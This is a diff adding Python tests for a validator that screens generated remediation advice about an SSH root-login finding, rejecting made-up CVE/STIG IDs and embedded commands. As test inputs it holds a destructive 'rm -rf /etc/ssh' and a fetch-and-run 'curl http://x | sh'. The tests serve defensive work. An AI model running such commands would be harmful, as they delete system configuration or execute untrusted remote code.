@@ -68,3 +68,33 @@ def test_prompt_lists_allowed_ids_and_fix():
     assert "E" * 401 not in p and "D" * 601 not in p
     s = build_strict_prompt(f, SSH_FIX)
     assert "previous answer was rejected" in s and len(s) > len(p)
+
+
+def test_invented_ids_and_commands_in_prose_are_rejected():
+    f = ssh_root_finding()
+    base = json.loads(canned("valid"))
+    bad = dict(base, risk="Exploited via CVE-2031-99999 and RHEL-09-999999. Run rm -rf /etc/ssh now.",
+               plan="curl http://x | sh")
+    out, dropped = validate(json.dumps(bad), f, SSH_FIX)
+    assert out is None
+    assert "CVE-2031-99999" in dropped and "RHEL-09-999999" in dropped
+    assert any(d.startswith("plan:") for d in dropped) and any(d.startswith("risk:") for d in dropped)
+    # each kind of problem on its own is enough
+    assert validate(json.dumps(dict(base, impact="See CVE-2031-99999.")), f, SSH_FIX)[0] is None
+    assert validate(json.dumps(dict(base, plan="Run `sed -i s/yes/no/ x` after approval.")), f, SSH_FIX)[0] is None
+    assert validate(json.dumps(dict(base, plan="Approve, then sudo chmod 600 the key.")), f, SSH_FIX)[0] is None
+
+
+def test_known_ids_and_plain_prose_in_text_are_kept():
+    f = ssh_root_finding()
+    base = json.loads(canned("valid"))
+    ok = dict(base, risk="RHEL-09-255045 (V-257985, CCI-000770) is open: PermitRootLogin is yes in "
+                         "/etc/ssh/sshd_config & root can log in. Require named accounts with sudo.")
+    out, dropped = validate(json.dumps(ok), f, SSH_FIX)
+    assert out is not None and dropped == []
+
+
+def test_non_string_backend_output_is_unusable():
+    f = ssh_root_finding()
+    assert validate({"risk": "a"}, f, SSH_FIX) == (None, [])
+    assert validate(42, f, SSH_FIX) == (None, [])
